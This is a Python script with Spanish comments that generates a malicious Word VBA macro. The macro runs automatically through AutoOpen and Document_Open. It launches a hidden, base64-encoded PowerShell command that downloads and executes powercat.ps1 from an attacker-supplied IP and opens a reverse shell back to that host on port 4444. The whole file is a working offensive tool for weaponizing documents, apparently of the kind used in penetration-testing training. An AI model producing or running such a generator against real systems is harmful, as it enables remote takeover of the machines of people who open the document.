import sys
import base64

# Verificar si se pasó la IP como argumento
if len(sys.argv) != 2:
    print("Uso: python macro-script.py <tu_ip>")
    sys.exit(1)

# Obtener la IP del argumento
ip = sys.argv[1]

# Construir el comando PowerShell
powershell_command = (
    f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}/powercat.ps1');"
    f"powercat -c {ip} -p 4444 -e powershell"
)

# Codificar el comando en base64
encoded_bytes = base64.b64encode(powershell_command.encode('utf-16le'))
encoded_str = encoded_bytes.decode('utf-8')

# Formatear el string en bloques de 50 caracteres
n = 50
formatted_payload = ''
for i in range(0, len(encoded_str), n):
    formatted_payload += f'                Str = Str + "{encoded_str[i:i+n]}"\n'

# Crear el contenido del macro
macro_content = f'''
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

                Str = Str + "powershell.exe -nop -w hidden -e "
{formatted_payload}    CreateObject("Wscript.Shell").Run Str

End Sub
'''

# Escribir el contenido en macro.txt
with open('macro.txt', 'w') as file:
    file.write(macro_content)

print("Macro creada exitosamente en macro.txt")
